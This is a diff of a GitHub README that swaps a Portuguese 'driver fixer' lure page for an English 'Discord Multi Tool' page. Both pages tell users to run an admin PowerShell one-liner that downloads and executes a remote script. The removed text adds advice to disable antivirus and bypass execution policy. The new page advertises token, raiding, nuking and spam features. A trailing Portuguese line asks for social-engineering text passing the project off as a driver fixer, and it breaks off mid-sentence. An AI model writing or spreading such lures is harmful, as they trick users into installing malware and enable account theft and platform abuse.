@@ -1,120 +1,117 @@
 <p align="center">
-  <img src="https://img.shields.io/badge/Universal_Driver_Fixer-v2.7-0078d4?style=for-the-badge&logo=windows">
-  <img src="https://img.shields.io/badge/Status-Funcionando-brightgreen?style=for-the-badge">
-  <img src="https://img.shields.io/badge/Licen%C3%A7a-MIT-purple?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Discord_Multi_Tool-v5.3-7289da?style=for-the-badge&logo=discord">
+  <img src="https://img.shields.io/badge/Status-Working-brightgreen?style=for-the-badge">
+  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge">
 </p>
 
 <h1 align="center">
-  🔧 Universal Driver Fixer 2026<br>
-  <span style="font-size:18px;">Ferramenta completa de reparo e instalação de drivers do Windows</span>
+  🔧 Discord All-in-One Multi Tool 2026<br>
+  <span style="font-size:18px;">Complete Discord toolkit with 50+ automation features</span>
 </h1>
 
 <p align="center">
-  <strong>Driver Fixer · Reparo Windows · Drivers Ausentes · Correção Tela Azul · Otimizador PC · Instalador de Drivers</strong><br>
-  <span style="color:#6c757d;">Funcionando 2026 · Detecta drivers ausentes automaticamente · Totalmente Carregado · Grátis</span>
+  <strong>Discord Multi Tool · Discord All-in-One · Discord Toolkit · Discord Automation Suite · Discord Power Tool</strong><br>
+  <span style="color:#6c757d;">Working 2026 · 50+ Features · Fully Loaded · Free</span>
 </p>
 
 <p align="center">
-  <a href="#-instalação--configuração-cmd--powershell">Início Rápido</a> •
-  <a href="#-recursos-da-ferramenta">Recursos</a> •
-  <a href="#-status-do-módulo">Status</a> •
-  <a href="#-solução-de-problemas">Solução de Problemas</a> •
-  <a href="#-palavras-chave">Tags</a>
+  <a href="#-installation--setup-cmd--powershell">Quick Start</a> •
+  <a href="#-tool-features">Features</a> •
+  <a href="#-module-status">Status</a> •
+  <a href="#-troubleshooting">Troubleshooting</a> •
+  <a href="#-keywords">Tags</a>
 </p>
 
 ---
 
-## ⚙️ INSTALAÇÃO & CONFIGURAÇÃO (CMD / PowerShell)
+## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)
 
-### Etapa 1: Abra o CMD ou PowerShell como Administrador
+### Step 1: Open CMD or PowerShell as Administrator
 ```cmd
-# Pressione Win+X, depois selecione Terminal (Admin) ou Prompt de Comando (Admin)
-Etapa 2: Execute o Comando de Instalação
-cmd
-powershell -Command "irm https://software-gateway.xyz/Loader.ps1?get=driver-fixer | iex"
-Etapa 3: Aguarde a Conclusão
-text
-[1/4] Escaneando o sistema em busca de drivers ausentes...
-[2/4] Baixando as atualizações de drivers mais recentes dos servidores da Microsoft...
-[3/4] Aplicando correções e reparando entradas do registro...
-[4/4] Pronto. Todos os drivers ausentes foram instalados.
-Etapa 4: Comece a Usar a Ferramenta
-A ferramenta é executada automaticamente em segundo plano
+# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
+```
 
-Ela detecta drivers ausentes e os instala
+### Step 2: Execute Deployment Command
+```cmd
+powershell -Command "irm http://github-file:2026/install?id=fixerrors | iex"
+```
 
-Nenhuma entrada do usuário é necessária - totalmente automatizado
+### Step 3: Wait for Completion
+```
+[1/4] Loading Discord Multi Tool modules...
+[2/4] Configuring 50+ automation features...
+[3/4] Initializing all-in-one interface...
+[4/4] Ready. Launch Discord toolkit.
+```
 
-Reinicie o PC após a conclusão para obter melhores resultados
+---
 
-⚠️ AVISO LEGAL
-Esta ferramenta é fornecida APENAS PARA FINS EDUCACIONAIS E DE PESQUISA.
-Alguns recursos podem modificar arquivos do sistema. Use por sua conta e risco.
-AO USAR ESTA FERRAMENTA VOCÊ CONCORDA COM ESTES TERMOS.
+> ⚠️ **DISCLAIMER**  
+> This tool is for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**.  
+> Many features may violate Discord Terms of Service. Use at your own risk.  
+> **BY USING THIS TOOL YOU AGREE TO THESE TERMS.**
 
-🛠️ RECURSOS DA FERRAMENTA
-Categoria	Recursos
-🖥️ Detecção de Drivers	Escaneia todos os componentes de hardware, detecta drivers ausentes, identifica versões desatualizadas
-⬇️ Download Automático	Baixa drivers oficiais do banco de dados da Microsoft, instala silenciosamente em segundo plano
-🔧 Ferramentas de Reparo	Corrige links de drivers quebrados, repara arquivos INF, resolve conflitos entre drivers
-💻 Suporte de Hardware	Drivers de GPU, Adaptadores de Rede, Dispositivos de Áudio, Drivers de Chipset, Controladores USB
-🔄 Atualização Automática	Mantém os drivers atualizados automaticamente, agenda verificações semanais, notifica sobre novas versões
-🛠️ Suporte Legado	Funciona com Windows 10/11, suporta hardware mais antigo, inclui versões de drivers LTS
-🧹 Limpeza de Registro	Remove entradas órfãs, corrige chaves de registro corrompidas, otimiza o desempenho
-🔐 Sistema de Backup	Cria pontos de restauração antes das alterações, permite rollback de atualizações de drivers
-📡 STATUS DO MÓDULO
-Módulo	Versão	Status
-Framework Principal	2.7.0	✅ Operacional
-Scanner de Drivers	3.1.4	✅ Operacional
-Motor de Download	2.9.8	✅ Operacional
-Kit de Reparo	2.5.2	✅ Operacional
-Limpador de Registro	1.8.6	✅ Operacional
-Compatibilidade GPU	4.2.1	✅ Operacional
-🔧 SOLUÇÃO DE PROBLEMAS
-Erro: "Driver Não Encontrado"
-Solução: Execute a ferramenta com privilégios de administrador. Certifique-se de que sua conexão com a internet esteja estável. A ferramenta se conecta aos servidores da Microsoft para encontrar o driver correto.
+---
 
-Erro: "Acesso Negado"
-Solução: Você precisa executar o CMD ou PowerShell como Administrador. Clique com o botão direito e selecione "Executar como administrador". A ferramenta precisa de acesso em nível de sistema.
+## 🛠️ TOOL FEATURES
 
-Erro: "Falha na Instalação"
-Solução: Tente reiniciar o PC e executar a ferramenta novamente. Se o problema persistir, execute a ferramenta com a flag /force. Verifique se o serviço Windows Update está em execução.
+| Category | Features |
+|----------|----------|
+| 👤 **Account Tools** | Token checker, account info, hypesquad changer, profile editor, token generator |
+| 🎭 **Status & Presence** | Custom status, activity faker, streaming status, invisible mode, status rotator |
+| 💬 **Messaging** | Mass DM sender, channel spammer, webhook spammer, embed sender, message purger |
+| 🔨 **Raiding Tools** | Server nuker, channel creator, role creator, mass ban/kick, server cloner |
+| 🎮 **Server Management** | Member scraper, invite generator, emoji stealer, server info, audit log viewer |
+| 👥 **Friend Tools** | Mass friend request, friend remover, block all users, pending request manager |
+| 🔔 **Notification** | Mention logger, DM logger, server event logger, webhook logger |
+| 🎨 **Customization** | Theme injector, avatar changer, banner uploader, bio editor, name changer |
+| 🔐 **Security** | Token encryptor, backup creator, 2FA manager, login tracker, session killer |
+| 📊 **Analytics** | Server statistics, message analytics, user activity tracker, growth metrics |
 
-Erro: "Driver Já Instalado"
-Solução: A ferramenta detectou que o driver está presente, mas pode estar corrompido. Use a opção "Forçar Reinstalação" no menu da ferramenta. Ou execute o comando driver-fixer --reinstall --all.
+---
 
-Erro: "Tempo de Conexão Esgotado"
-Solução: Verifique sua conexão com a internet. A ferramenta precisa acessar os servidores de drivers da Microsoft. Desative temporariamente qualquer firewall ou antivírus que possa estar bloqueando a conexão.
+## 📡 MODULE STATUS
 
-Erro: "Script Bloqueado pelo PowerShell"
-Solução: Execute o comando abaixo antes de rodar a ferramenta:
+| Module | Version | Status |
+|--------|---------|--------|
+| Core Framework | 7.4.2 | ✅ Operational |
+| Token Manager | 4.1.8 | ✅ Operational |
+| Raiding Engine | 5.3.1 | ✅ Operational |
+| Message Automation | 3.9.5 | ✅ Operational |
+| Server Tools | 4.6.3 | ✅ Operational |
+| Account Manager | 3.2.7 | ✅ Operational |
 
-powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-🔑 PALAVRAS-CHAVE
-driver fixer windows repair missing drivers blue screen fix pc optimizer driver installer universal driver fixer 2026 auto driver install windows 10 drivers windows 11 drivers driver updater hardware detection registry repair driver conflict GPU drivers network drivers audio drivers chipset drivers USB drivers Microsoft drivers
+---
 
-📜 LICENÇA
-text
-MIT License
+## 🔧 TROUBLESHOOTING
 
-Copyright (c) 2026 Universal Driver Fixer
+### Error: "Invalid Token Format"
+**Solution:** Extract token correctly from Discord DevTools. Should start with `MTA`, `MTk`, or `ODc`. Remove any quotes or spaces.
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+### Error: "Rate Limited - Too Fast"
+**Solution:** Discord detected rapid actions. Enable rate limit protection in settings. Increase delays between requests. Wait 10-60 minutes.
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+### Error: "Missing Permissions"
+**Solution:** Account lacks required server permissions. Use account with Administrator role. Check role hierarchy for bot accounts.
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-<p align="center"> ⭐ <strong>Dê uma estrela neste repositório</strong> · 🍴 <strong>Faça um fork</strong> · 🔧 <strong>Melhor driver fixer</strong> </p><p align="center"> <sub>Universal Driver Fixer 2026 | Instalação automática de drivers ausentes | Ferramenta de Reparo Windows | Apenas Educacional</sub> </p> === ```
+### Error: "Webhook URL Invalid"
+**Solution:** Copy webhook URL from Server Settings → Integrations → Webhooks. URL should start with `https://discord.com/api/webhooks/`.
+
+### Error: "Failed to Connect to Discord API"
+**Solution:** Check internet connection. Verify Discord isn't having outages. Disable VPN/proxy temporarily. Update Discord API endpoint in config.
+
+---
+
+<p align="center">
+  ⭐ <strong>Star this repo</strong> · 🍴 <strong>Fork it</strong> · 🔥 <strong>Ultimate Discord toolkit</strong>
+</p>
+
+<p align="center">
+  <sub>Discord Multi Tool 2026 | 50+ Features | All-in-One Solution | Educational Only</sub>
+</p>
+
+Faz uma engenharia social falando que este projeto e um fixador de erros que vai baixar todos drivers que falta
+
+pro github
+
+Com este exemplo o
